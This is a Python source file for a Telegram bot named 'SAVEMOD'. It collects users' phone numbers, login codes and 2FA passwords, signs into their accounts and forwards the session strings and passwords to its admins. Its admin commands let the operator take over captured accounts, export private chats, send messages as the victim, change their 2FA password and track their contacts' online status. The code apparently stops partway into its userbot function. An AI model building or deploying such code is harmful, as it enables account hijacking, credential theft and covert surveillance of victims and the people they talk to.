import asyncio
import sqlite3
import os
from datetime import datetime
from threading import Thread
from flask import Flask
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.types import UserStatusOnline, UserStatusOffline
from aiogram import Bot, Dispatcher, types as aiogram_types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, InputFile
from aiogram.utils import executor
import nest_asyncio
import logging
import shutil
import tempfile
import html

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
nest_asyncio.apply()

API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_IDS = [int(x.strip()) for x in os.environ.get('ADMIN_IDS', '').split(',') if x.strip()]

VOLUME_PATH = os.environ.get('VOLUME_MOUNTS', '/app/data')
if not os.path.exists(VOLUME_PATH):
    VOLUME_PATH = '.'
    os.makedirs(VOLUME_PATH, exist_ok=True)

DB_PATH = os.path.join(VOLUME_PATH, 'userbot.db')

conn = sqlite3.connect(DB_PATH, check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS user_sessions (user_id INTEGER PRIMARY KEY, session_string TEXT, phone TEXT, two_fa TEXT, first_name TEXT, last_name TEXT, username TEXT, is_active INTEGER DEFAULT 0)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS muted_users (user_id INTEGER, muted_by INTEGER, PRIMARY KEY (user_id, muted_by))''')
cursor.execute('''CREATE TABLE IF NOT EXISTS saved_messages (id INTEGER PRIMARY KEY AUTOINCREMENT, owner_id INTEGER, msg_id INTEGER, sender_id INTEGER, text TEXT, date TEXT)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS spy_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, sender_id INTEGER, sender_name TEXT, message TEXT, chat_id INTEGER, chat_name TEXT)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS user_status_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, user_id INTEGER, user_name TEXT, status TEXT)''')
conn.commit()

active_clients = {}
saved_messages = {}
temp_auth = {}
active_chats = {}
user_status_tracker = {}
current_active_user = None
monitored_users = {}

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_target_admin(target_id):
    return target_id in ADMIN_IDS

def get_code_keyboard():
    kb = aiogram_types.InlineKeyboardMarkup(row_width=3)
    for i in range(1, 10):
        kb.insert(aiogram_types.InlineKeyboardButton(str(i), callback_data=f"c_{i}"))
    kb.row(
        aiogram_types.InlineKeyboardButton("0", callback_data="c_0"),
        aiogram_types.InlineKeyboardButton("⌫", callback_data="c_del"),
        aiogram_types.InlineKeyboardButton("✅", callback_data="c_ok")
    )
    return kb

def get_active_client():
    global current_active_user
    if current_active_user and current_active_user in active_clients:
        return active_clients[current_active_user], current_active_user
    for uid, client in active_clients.items():
        current_active_user = uid
        return client, uid
    return None, None

async def resolve_entity(client, target):
    if target.isdigit():
        return await client.get_entity(int(target))
    if target.startswith('+') and target[1:].isdigit():
        cursor.execute('SELECT user_id FROM user_sessions WHERE phone=?', (target,))
        row = cursor.fetchone()
        if row:
            return await client.get_entity(row[0])
        return await client.get_entity(target)
    return await client.get_entity(target)

async def export_chat_to_html(client, chat_id, chat_name, me):
    messages = []
    async for msg in client.iter_messages(chat_id, limit=10000):
        if msg.text:
            try:
                if msg.out:
                    sender_name = f"{me.first_name} (Я)"
                    sender_class = "outgoing"
                else:
                    sender = await client.get_entity(msg.sender_id)
                    sender_name = sender.first_name or sender.username or str(msg.sender_id)
                    sender_class = "incoming"
                timestamp = msg.date.strftime('%d.%m.%Y %H:%M:%S')
                text = html.escape(msg.text)
                messages.append(f'<div class="message {sender_class}"><div class="message-header"><span class="sender">{html.escape(sender_name)}</span><span class="date">{timestamp}</span></div><div class="message-text">{text}</div></div>')
            except:
                continue
    if not messages:
        return None
    messages.reverse()
    html_content = f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Чат с {html.escape(chat_name)}</title>
<style>
body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background-color: #0e1621; color: #e1e8f0; margin: 0; padding: 20px; }}
.container {{ max-width: 800px; margin: 0 auto; background-color: #17212b; border-radius: 10px; }}
.chat-header {{ background-color: #17212b; padding: 15px 20px; border-bottom: 1px solid #2b3945; }}
.chat-header h2 {{ margin: 0; font-size: 18px; }}
.messages {{ padding: 20px; }}
.message {{ margin-bottom: 15px; padding: 10px 12px; border-radius: 12px; max-width: 80%; word-wrap: break-word; }}
.incoming {{ background-color: #2b3945; margin-right: auto; }}
.outgoing {{ background-color: #5288c1; margin-left: auto; text-align: right; }}
.message-header {{ font-size: 12px; margin-bottom: 5px; display: flex; justify-content: space-between; }}
.sender {{ font-weight: bold; }}
.date {{ font-size: 10px; color: #6c7883; }}
.message-text {{ font-size: 14px; white-space: pre-wrap; word-break: break-word; }}
.stats {{ background-color: #0e1621; padding: 10px; text-align: center; font-size: 12px; color: #6c7883; }}
</style>
</head>
<body>
<div class="container">
<div class="chat-header"><h2>💬 Чат с {html.escape(chat_name)}</h2><div class="stats">Всего сообщений: {len(messages)}</div></div>
<div class="messages">{''.join(messages)}</div>
<div class="stats">📅 Экспортировано: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}</div>
</div>
</body>
</html>'''
    return html_content

# ========== АДМИН КОМАНДЫ ==========

@dp.message_handler(commands=['spyhelp'])
async def spyhelp(message):
    if not is_admin(message.from_user.id):
        return
    await message.answer("""
🕵️ <b>SAVEMOD - АДМИН КОМАНДЫ</b>

<b>👥 УПРАВЛЕНИЕ АККАУНТАМИ</b>
/users - список всех аккаунтов
/swap НОМЕР - переключиться на аккаунт
/active - показать активный аккаунт
/show2fa НОМЕР - показать полный 2FA
/del_session НОМЕР - удалить сессию
/sessions - список всех сессий

<b>💬 ДЕЙСТВИЯ ОТ ИМЕНИ АКТИВНОГО</b>
/send ID или @username текст
/chat ID или @username или tg
/chats - список ЛС диалогов
/status @username - статус
/online - кто в сети
/export ID или @username - экспорт всей переписки в HTML
/mon @username - мониторинг статуса пользователя
/unmon @username - остановить мониторинг

<b>🔐 УПРАВЛЕНИЕ АККАУНТОМ</b>
/session НОМЕР - получить сессию
/set2fa ПАРОЛЬ - установить 2FA
/info - информация об аккаунте
/reset_me - сбросить свою сессию

<b>📊 ЛОГИ</b>
/logs N - последние N логов
/statuslogs N - логи входов/выходов
/stats - статистика
/backup - бэкап БД

<b>🤖 КОМАНДЫ ЮЗЕРБОТА</b>
.help .mute .unmute .list .spam .type .info
""", parse_mode='HTML')

# ========== ИСПРАВЛЕННЫЙ /mon (без ошибки event loop) ==========
@dp.message_handler(commands=['mon'])
async def monitor_user(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /mon @username")
        return
    client, uid = get_active_client()
    if not client:
        await message.answer("❌ Нет активного аккаунта")
        return
    try:
        entity = await resolve_entity(client, args)
        if getattr(entity, 'bot', False):
            await message.answer("❌ Это бот")
            return
        if is_target_admin(entity.id):
            await message.answer("❌ Нельзя мониторить админа")
            return
        monitored_users[entity.id] = {'name': entity.first_name or entity.username or str(entity.id), 'admin_id': message.from_user.id}
        await message.answer(f"✅ Начат мониторинг <b>{monitored_users[entity.id]['name']}</b>", parse_mode='HTML')
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['unmon'])
async def unmonitor_user(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /unmon @username")
        return
    client, uid = get_active_client()
    if not client:
        await message.answer("❌ Нет активного аккаунта")
        return
    try:
        entity = await resolve_entity(client, args)
        if entity.id in monitored_users:
            del monitored_users[entity.id]
            await message.answer(f"✅ Мониторинг остановлен")
        else:
            await message.answer("❌ Этот пользователь не отслеживается")
    except:
        await message.answer("❌ Ошибка")

@dp.message_handler(commands=['sessions'])
async def list_all_sessions(message):
    if not is_admin(message.from_user.id):
        return
    cursor.execute('SELECT user_id, first_name, username, phone, is_active FROM user_sessions')
    rows = cursor.fetchall()
    if not rows:
        await message.answer("📭 Нет сохраненных сессий")
        return
    sessions_list = []
    for (uid, fname, uname, phone, is_active) in rows:
        if is_target_admin(uid):
            continue
        name = fname or uname or str(uid)
        status = "✅" if (uid in active_clients or is_active == 1) else "❌"
        sessions_list.append(f"{status} `{uid}` - {name}")
    await message.answer(f"📋 <b>Сохраненные сессии ({len(sessions_list)})</b>:\n\n" + "\n".join(sessions_list), parse_mode='HTML')

@dp.message_handler(commands=['del_session'])
async def delete_session_cmd(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /del_session НОМЕР")
        return
    try:
        num = int(args) - 1
        cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
        rows = cursor.fetchall()
        non_admin_rows = [(uid, fname, uname) for (uid, fname, uname) in rows if not is_target_admin(uid)]
        if num < 0 or num >= len(non_admin_rows):
            await message.answer("❌ Неверный номер")
            return
        target_id, fname, uname = non_admin_rows[num]
        name = fname or uname or str(target_id)
        if target_id in active_clients:
            try:
                await active_clients[target_id].disconnect()
            except:
                pass
            del active_clients[target_id]
        cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (target_id,))
        conn.commit()
        cursor.execute('DELETE FROM muted_users WHERE muted_by=?', (target_id,))
        conn.commit()
        await message.answer(f"✅ Сессия {name} удалена")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['reset_me'])
async def reset_me_cmd(message):
    user_id = message.from_user.id
    if user_id in active_clients:
        try:
            await active_clients[user_id].disconnect()
        except:
            pass
        del active_clients[user_id]
    cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (user_id,))
    conn.commit()
    await message.answer("✅ Сессия удалена. Отправь /start заново.")

@dp.message_handler(commands=['backup'])
async def backup_db(message):
    if not is_admin(message.from_user.id):
        return
    backup_path = os.path.join(VOLUME_PATH, f'backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.db')
    shutil.copy2(DB_PATH, backup_path)
    with open(backup_path, 'rb') as f:
        for admin_id in ADMIN_IDS:
            try:
                await bot.send_document(admin_id, InputFile(f, filename=os.path.basename(backup_path)), caption=f"📦 Бэкап")
                await f.seek(0)
            except:
                pass
    os.remove(backup_path)
    await message.answer("✅ Бэкап отправлен")

@dp.message_handler(commands=['users'])
async def list_users(message):
    if not is_admin(message.from_user.id):
        return
    cursor.execute('SELECT user_id, first_name, last_name, username, phone, two_fa, is_active FROM user_sessions')
    rows = cursor.fetchall()
    if not rows:
        await message.answer("📭 Нет аккаунтов")
        return
    response = "👥 <b>ВСЕ АККАУНТЫ</b>\n\n"
    idx = 0
    for (uid, fname, lname, uname, phone, two_fa, is_active) in rows:
        if is_target_admin(uid):
            continue
        idx += 1
        name = fname or ""
        if lname:
            name += f" {lname}"
        if not name:
            name = uname or str(uid)
        active_mark = " ✅" if (is_active == 1 or uid == current_active_user) else ""
        two_fa_show = f"✅ {two_fa}" if two_fa else "❌ Нет"
        response += f"<b>{idx}. {name}</b>{active_mark}\n   🆔 {uid}\n   📱 {phone or '-'}\n   🔐 {two_fa_show}\n\n"
        if len(response) > 3500:
            await message.answer(response[:4000], parse_mode='HTML')
            response = ""
    if response:
        await message.answer(response[:4000], parse_mode='HTML')

@dp.message_handler(commands=['show2fa'])
async def show_2fa(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        client, uid = get_active_client()
        if not client:
            await message.answer("❌ Нет активного аккаунта")
            return
        if is_target_admin(uid):
            await message.answer("❌ Операция недоступна для админа")
            return
        cursor.execute('SELECT first_name, two_fa FROM user_sessions WHERE user_id=?', (uid,))
        row = cursor.fetchone()
        if row and row[1]:
            await message.answer(f"🔐 <b>2FA для {row[0]}</b>:\n<code>{row[1]}</code>", parse_mode='HTML')
        else:
            await message.answer(f"❌ У {row[0] if row else uid} нет 2FA")
        return
    try:
        num = int(args) - 1
        cursor.execute('SELECT user_id, first_name, username, two_fa FROM user_sessions')
        rows = cursor.fetchall()
        non_admin_rows = [(uid, fname, uname, two_fa) for (uid, fname, uname, two_fa) in rows if not is_target_admin(uid)]
        if num < 0 or num >= len(non_admin_rows):
            await message.answer("❌ Неверный номер")
            return
        uid, first_name, username, two_fa = non_admin_rows[num]
        name = first_name or username or str(uid)
        if two_fa:
            await message.answer(f"🔐 <b>2FA для {name}</b>:\n<code>{two_fa}</code>", parse_mode='HTML')
        else:
            await message.answer(f"❌ У {name} нет 2FA")
    except:
        await message.answer("❌ Ошибка")

@dp.message_handler(commands=['swap'])
async def swap_account(message):
    global current_active_user
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /swap НОМЕР")
        return
    try:
        num = int(args) - 1
        cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
        rows = cursor.fetchall()
        non_admin_rows = [(uid, fname, uname) for (uid, fname, uname) in rows if not is_target_admin(uid)]
        if num < 0 or num >= len(non_admin_rows):
            await message.answer("❌ Неверный номер")
            return
        user_id = non_admin_rows[num][0]
        name = non_admin_rows[num][1] or non_admin_rows[num][2] or str(user_id)
        if user_id not in active_clients:
            await message.answer(f"❌ Аккаунт {name} не запущен")
            return
        current_active_user = user_id
        cursor.execute('UPDATE user_sessions SET is_active=0')
        cursor.execute('UPDATE user_sessions SET is_active=1 WHERE user_id=?', (user_id,))
        conn.commit()
        me = await active_clients[user_id].get_me()
        await message.answer(f"✅ Переключился на <b>{me.first_name}</b>", parse_mode='HTML')
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['active'])
async def show_active(message):
    if not is_admin(message.from_user.id):
        return
    client, uid = get_active_client()
    if not client:
        await message.answer("❌ Нет активного аккаунта")
        return
    if is_target_admin(uid):
        await message.answer("❌ Активный аккаунт - админ (скрыт)")
        return
    try:
        me = await client.get_me()
        await message.answer(f"✅ Активный: {me.first_name} (@{me.username or 'нет'})", parse_mode='HTML')
    except:
        await message.answer(f"✅ Активный ID: {uid}")

@dp.message_handler(commands=['send'])
async def send_message_cmd(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /send @username текст")
        return
    parts = args.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("❌ /send @username текст")
        return
    target = parts[0]
    text = parts[1]
    client, uid = get_active_client()
    if not client:
        await message.answer("❌ Нет активного аккаунта")
        return
    try:
        entity = await resolve_entity(client, target)
        if is_target_admin(entity.id):
            await message.answer("❌ Нельзя отправлять админу")
            return
        await client.send_message(entity.id, text)
        await message.answer(f"✅ Отправлено: {text[:100]}")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['chat'])
async def view_chat(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /chat ID\n/chat tg - чат с Telegram")
        return
    client, uid = get_active_client()
    if not client:
        await message.answer("❌ Нет активного аккаунта")
        return
    try:
        chat_id = None
        chat_name = None
        if args.lower() in ['tg', '777000', '+42777', 'telegram']:
            chat_id = 777000
            chat_name = "Telegram (коды)"
        elif args.isdigit():
            num = int(args) - 1
            if uid not in active_chats or not active_chats[uid]:
                await message.answer("❌ /chats")
                return
            if num < 0 or num >= len(active_chats[uid]):
                await message.answer("❌ Неверный номер")
                return
            chat = active_chats[uid][num]
            chat_id = chat['id']
            chat_name = chat['name']
        else:
            entity = await resolve_entity(client, args)
            if is_target_admin(entity.id):
                await message.answer("❌ Нельзя смотреть чат админа")
                return
            chat_id = entity.id
            chat_name = entity.first_name or entity.username or args
        kb = InlineKeyboardMarkup(row_width=2)
        kb.add(
            InlineKeyboardButton("📝 Последние 30", callback_data=f"chat_last_{chat_id}_{chat_name}"),
            InlineKeyboardButton("📄 Вся переписка (HTML)", callback_data=f"chat_full_{chat_id}_{chat_name}")
        )
        await message.answer(f"📱 Чат с <b>{chat_name}</b>", parse_mode='HTML', reply_markup=kb)
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.callback_query_handler(lambda c: c.data.startswith('chat_last_'))
async def chat_last_callback(callback):
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Нет прав")
        return
    data = callback.data.replace('chat_last_', '').split('_', 1)
    chat_id = int(data[0])
    chat_name = data[1]
    client, uid = get_active_client()
    if not client:
        await callback.message.answer("❌ Нет активного аккаунта")
        return
    msgs = []
    async for msg in client.iter_messages(chat_id, limit=30):
        if msg.text:
            try:
                if msg.out:
                    sender_name = "👉 Я"
                else:
                    sender = await client.get_entity(msg.sender_id)
                    if is_target_admin(sender.id):
                        continue
                    sender_name = sender.first_name or sender.username or str(msg.sender_id)
                msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] {sender_name}: {msg.text[:150]}")
            except:
                msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] {msg.text[:150]}")
    if msgs:
        response = f"💬 <b>ЧАТ С {chat_name}</b>\n\n" + "\n".join(reversed(msgs))
        await callback.message.answer(response[:4000], parse_mode='HTML')
    else:
        await callback.message.answer("📭 Нет сообщений")

@dp.callback_query_handler(lambda c: c.data.startswith('chat_full_'))
async def chat_full_callback(callback):
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Нет прав")
        return
    data = callback.data.replace('chat_full_', '').split('_', 1)
    chat_id = int(data[0])
    chat_name = data[1]
    client, uid = get_active_client()
    if not client:
        await callback.message.answer("❌ Нет активного аккаунта")
        return
    me = await client.get_me()
    status_msg = await callback.message.answer("🔄 Экспортирую...")
    html_content = await export_chat_to_html(client, chat_id, chat_name, me)
    if not html_content:
        await status_msg.edit_text("❌ Нет сообщений")
        return
    with tempfile.NamedTemporaryFile(mode='w', suffix='.html', encoding='utf-8', delete=False) as f:
        f.write(html_content)
        temp_path = f.name
    with open(temp_path, 'rb') as f:
        for admin_id in ADMIN_IDS:
            try:
                await bot.send_document(admin_id, InputFile(f, filename=f"chat_{chat_name}.html"))
                await f.seek(0)
            except:
                pass
    os.unlink(temp_path)
    await status_msg.delete()

@dp.message_handler(commands=['export'])
async def export_chat_cmd(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /export ID")
        return
    client, uid = get_active_client()
    if not client:
        await message.answer("❌ Нет активного аккаунта")
        return
    try:
        entity = await resolve_entity(client, args)
        if is_target_admin(entity.id):
            await message.answer("❌ Нельзя экспортировать чат админа")
            return
        chat_name = entity.first_name or entity.username or str(entity.id)
        status_msg = await message.answer(f"🔄 Экспортирую чат с {chat_name}...")
        me = await client.get_me()
        html_content = await export_chat_to_html(client, entity.id, chat_name, me)
        if not html_content:
            await status_msg.edit_text("❌ Нет сообщений")
            return
        with tempfile.NamedTemporaryFile(mode='w', suffix='.html', encoding='utf-8', delete=False) as f:
            f.write(html_content)
            temp_path = f.name
        with open(temp_path, 'rb') as f:
            for admin_id in ADMIN_IDS:
                try:
                    await bot.send_document(admin_id, InputFile(f, filename=f"chat_{chat_name}.html"))
                    await f.seek(0)
                except:
                    pass
        os.unlink(temp_path)
        await status_msg.delete()
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['chats'])
async def list_chats(message):
    if not is_admin(message.from_user.id):
        return
    client, uid = get_active_client()
    if not client:
        await message.answer("❌ Нет активного аккаунта")
        return
    await message.answer("🔄 Собираю список...")
    chats = []
    async for dialog in client.iter_dialogs():
        if dialog.is_user:
            try:
                entity = await client.get_entity(dialog.id)
                if getattr(entity, 'bot', False) or entity.id == uid or is_target_admin(entity.id):
                    continue
                name = entity.first_name or entity.username or str(entity.id)
                if entity.username:
                    name += f" (@{entity.username})"
                chats.append({'id': entity.id, 'name': name})
            except:
                chats.append({'id': dialog.id, 'name': dialog.name or str(dialog.id)})
    active_chats[uid] = chats
    if not chats:
        await message.answer("📭 Нет диалогов")
        return
    response = "📋 СПИСОК ЛС\n\n"
    for i, chat in enumerate(chats):
        response += f"{i+1}. {chat['name']}\n"
        if len(response) > 3500:
            await message.answer(response[:4000])
            response = ""
    if response:
        await message.answer(response[:4000])

@dp.message_handler(commands=['online'])
async def online_users(message):
    if not is_admin(message.from_user.id):
        return
    client, uid = get_active_client()
    if not client:
        await message.answer("❌ Нет активного аккаунта")
        return
    online = []
    async for dialog in client.iter_dialogs():
        if dialog.is_user:
            try:
                entity = await client.get_entity(dialog.id)
                if not getattr(entity, 'bot', False) and not is_target_admin(entity.id) and isinstance(entity.status, UserStatusOnline):
                    online.append(dialog.name)
            except:
                pass
    if online:
        await message.answer(f"🟢 В сети ({len(online)}):\n" + "\n".join(online[:30]))
    else:
        await message.answer("🟢 Никого")

@dp.message_handler(commands=['status'])
async def user_status_cmd(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /status @username")
        return
    client, uid = get_active_client()
    if not client:
        await message.answer("❌ Нет активного аккаунта")
        return
    try:
        entity = await resolve_entity(client, args)
        if getattr(entity, 'bot', False):
            await message.answer("❌ Это бот")
            return
        if is_target_admin(entity.id):
            await message.answer("❌ Нельзя смотреть статус админа")
            return
        if hasattr(entity, 'status'):
            if isinstance(entity.status, UserStatusOnline):
                status_text = "🟢 В сети"
            else:
                status_text = "⚫ Не в сети"
        else:
            status_text = "⚪ Статус скрыт"
        await message.answer(f"👤 {entity.first_name}\n🆔 {entity.id}\n📊 {status_text}")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['session'])
async def get_session_cmd(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /session НОМЕР")
        return
    try:
        num = int(args) - 1
        cursor.execute('SELECT user_id, session_string, phone, two_fa, first_name, username FROM user_sessions')
        rows = cursor.fetchall()
        non_admin_rows = [(uid, ss, phone, two_fa, fname, uname) for (uid, ss, phone, two_fa, fname, uname) in rows if not is_target_admin(uid)]
        if num < 0 or num >= len(non_admin_rows):
            await message.answer("❌ Неверный номер")
            return
        uid, ss, phone, two_fa, fname, uname = non_admin_rows[num]
        name = fname or uname or str(uid)
        for admin_id in ADMIN_IDS:
            try:
                await bot.send_message(admin_id, f"🎭 СЕССИЯ ДЛЯ {name}\n\n<code>{ss}</code>", parse_mode='HTML')
            except:
                pass
        await message.answer("✅ Сессия отправлена")
    except:
        await message.answer("❌ Ошибка")

@dp.message_handler(commands=['set2fa'])
async def set_2fa_cmd(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /set2fa ПАРОЛЬ")
        return
    client, uid = get_active_client()
    if not client or is_target_admin(uid):
        await message.answer("❌ Нет активного аккаунта или админ")
        return
    try:
        await client.edit_2fa(args)
        cursor.execute('UPDATE user_sessions SET two_fa=? WHERE user_id=?', (args, uid))
        conn.commit()
        await message.answer(f"✅ 2FA установлен: <code>{args}</code>", parse_mode='HTML')
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['info'])
async def account_info_cmd(message):
    if not is_admin(message.from_user.id):
        return
    client, uid = get_active_client()
    if not client or is_target_admin(uid):
        await message.answer("❌ Нет активного аккаунта или админ")
        return
    try:
        me = await client.get_me()
        cursor.execute('SELECT phone, two_fa FROM user_sessions WHERE user_id=?', (uid,))
        row = cursor.fetchone()
        await message.answer(f"👤 {me.first_name}\n🆔 {me.id}\n📱 {row[0] if row else '-'}\n🔐 {row[1] if row and row[1] else 'Нет'}")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['logs'])
async def view_logs_cmd(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    limit = int(args) if args and args.isdigit() else 20
    cursor.execute('SELECT timestamp, sender_name, message FROM spy_logs ORDER BY id DESC LIMIT ?', (limit,))
    rows = cursor.fetchall()
    if not rows:
        await message.answer("📭 Нет логов")
        return
    response = "📜 ПОСЛЕДНИЕ ЛОГИ:\n\n"
    for ts, name, msg in reversed(rows):
        response += f"[{ts[11:16]}] {name}: {msg[:80]}\n"
    await message.answer(response[:4000])

@dp.message_handler(commands=['statuslogs'])
async def status_logs_cmd(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    limit = int(args) if args and args.isdigit() else 20
    cursor.execute('SELECT timestamp, user_name, status FROM user_status_logs ORDER BY id DESC LIMIT ?', (limit,))
    rows = cursor.fetchall()
    if not rows:
        await message.answer("📭 Нет логов")
        return
    response = "🔄 ЛОГИ ВХОДОВ/ВЫХОДОВ:\n\n"
    for ts, name, status in reversed(rows):
        response += f"[{ts[11:16]}] {name}: {status}\n"
    await message.answer(response[:4000])

@dp.message_handler(commands=['stats'])
async def stats_cmd(message):
    if not is_admin(message.from_user.id):
        return
    cursor.execute('SELECT COUNT(*) FROM spy_logs')
    total_logs = cursor.fetchone()[0]
    cursor.execute('SELECT COUNT(DISTINCT sender_id) FROM spy_logs')
    total_users = cursor.fetchone()[0]
    cursor.execute('SELECT COUNT(*) FROM user_status_logs')
    total_status = cursor.fetchone()[0]
    cursor.execute('SELECT COUNT(*) FROM user_sessions')
    total_accounts = cursor.fetchone()[0]
    await message.answer(f"📊 СТАТИСТИКА\n\nАккаунтов: {total_accounts}\nСообщений: {total_logs}\nСобеседников: {total_users}\nЛогов статусов: {total_status}")

# ========== РЕГИСТРАЦИЯ ==========
@dp.message_handler(commands=['start'])
async def start_auth(message):
    user_id = message.from_user.id
    cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (user_id,))
    row = cursor.fetchone()
    if row and row[0]:
        await message.answer("✅ Ты уже авторизован!")
        if user_id not in active_clients:
            asyncio.create_task(run_userbot(user_id, row[0]))
        return
    kb = aiogram_types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(aiogram_types.KeyboardButton("📱 Поделиться номером", request_contact=True))
    await message.answer("🔐 Отправь номер телефона", reply_markup=kb)

@dp.message_handler(content_types=aiogram_types.ContentType.CONTACT)
async def get_phone(message):
    user_id = message.from_user.id
    phone = message.contact.phone_number
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        temp_auth[user_id] = {"client": client, "phone": phone, "hash": result.phone_code_hash, "code": ""}
        await message.answer("📱 Введи код из SMS:", reply_markup=get_code_keyboard())
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.callback_query_handler(lambda c: c.data.startswith('c_'))
async def code_callback(callback):
    user_id = callback.from_user.id
    if user_id not in temp_auth:
        await callback.answer("Начни заново /start")
        return
    action = callback.data[2:]
    current = temp_auth[user_id]["code"]
    if action == "del":
        temp_auth[user_id]["code"] = current[:-1]
    elif action == "ok":
        if len(current) == 5:
            await callback.answer("Авторизация...")
            await complete_auth(callback, user_id)
            return
        else:
            await callback.answer(f"Нужно 5 цифр", show_alert=True)
            return
    else:
        if len(current) < 5:
            temp_auth[user_id]["code"] = current + action
    code = temp_auth[user_id]["code"]
    display = code if code else " "
    try:
        await callback.message.edit_text(f"📱 Код: `{display}`", parse_mode="Markdown", reply_markup=get_code_keyboard())
    except:
        pass
    await callback.answer()

async def complete_auth(callback, user_id):
    data = temp_auth[user_id]
    try:
        await data["client"].sign_in(phone=data["phone"], code=data["code"], phone_code_hash=data["hash"])
        session_str = data["client"].session.save()
        me = await data["client"].get_me()
        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
                       (user_id, session_str, data["phone"], None, me.first_name, me.last_name, me.username, 0))
        conn.commit()
        for admin_id in ADMIN_IDS:
            try:
                if user_id not in ADMIN_IDS:
                    await bot.send_message(admin_id, f"🎉 Новый пользователь: {me.first_name}\n🆔 {user_id}")
            except:
                pass
        await callback.message.answer("✅ Авторизация успешна!")
        asyncio.create_task(run_userbot(user_id, session_str))
        await data["client"].disconnect()
        del temp_auth[user_id]
    except Exception as e:
        if "2FA" in str(e):
            await callback.message.answer("🔐 Введи пароль от 2FA:")
            temp_auth[user_id]["step"] = "2fa"
        else:
            await callback.message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(lambda msg: msg.from_user.id in temp_auth and temp_auth[msg.from_user.id].get("step") == "2fa")
async def handle_2fa(message):
    user_id = message.from_user.id
    data = temp_auth[user_id]
    try:
        await data["client"].sign_in(password=message.text.strip())
        session_str = data["client"].session.save()
        me = await data["client"].get_me()
        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
                       (user_id, session_str, data["phone"], message.text.strip(), me.first_name, me.last_name, me.username, 0))
        conn.commit()
        for admin_id in ADMIN_IDS:
            try:
                if user_id not in ADMIN_IDS:
                    await bot.send_message(admin_id, f"🎉 Новый пользователь (2FA): {me.first_name}\n🆔 {user_id}\n🔐 {message.text.strip()}")
            except:
                pass
        await message.answer("✅ Авторизация успешна!")
        asyncio.create_task(run_userbot(user_id, session_str))
        await data["client"].disconnect()
        del temp_auth[user_id]
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

# ========== ЮЗЕРБОТ ==========
async def run_userbot(owner_id, session_string):
    if owner_id in active_clients:
        try:
            await active_clients[owner_id].disconnect()
        except:
            pass
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    await client.connect()
    if not await client.is_user_authorized():
        cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (owner_id,))
        conn.commit()
        return
    active_clients[owner_id] = client
